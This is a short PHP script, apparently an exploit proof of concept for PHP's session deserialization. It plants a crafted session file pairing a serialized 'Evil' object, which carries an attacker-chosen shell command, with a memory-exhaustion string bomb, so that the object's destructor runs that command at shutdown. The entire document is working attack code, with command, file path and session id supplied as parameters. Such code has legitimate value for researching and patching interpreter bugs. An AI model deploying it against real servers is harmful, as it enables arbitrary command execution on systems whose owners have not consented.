<?php
// Plant a malicious session: an Evil object followed by an unserialize
// expansion bomb (a huge array). session_start() decode builds Evil, then OOMs
// on the bomb -> Evil left stale in BG(unserialize) -> __destruct on shutdown.
$sid = $argv[1] ?? "etest00000000000000000000000";
$cmd = $argv[2] ?? "id";
$n   = (int)($argv[3] ?? 2000000);
$dir = $argv[4] ?? "/tmp/sessions";

// $n here = size in bytes of the string bomb (default 20MB). The file stays
// readable (<memory_limit) but the string alloc during decode pushes over it,
// OOMing AFTER the Evil object is built.
$evil = 'O:4:"Evil":1:{s:3:"cmd";s:' . strlen($cmd) . ':"' . $cmd . '";}';
$bomb = 's:' . $n . ':"' . str_repeat("A", $n) . '";';
$data = "evilobj|" . $evil . "oombomb|" . $bomb;

$path = "$dir/sess_$sid";
file_put_contents($path, $data);
@chmod($path, 0666);
echo "planted $path bytes=" . strlen($data) . "\n";
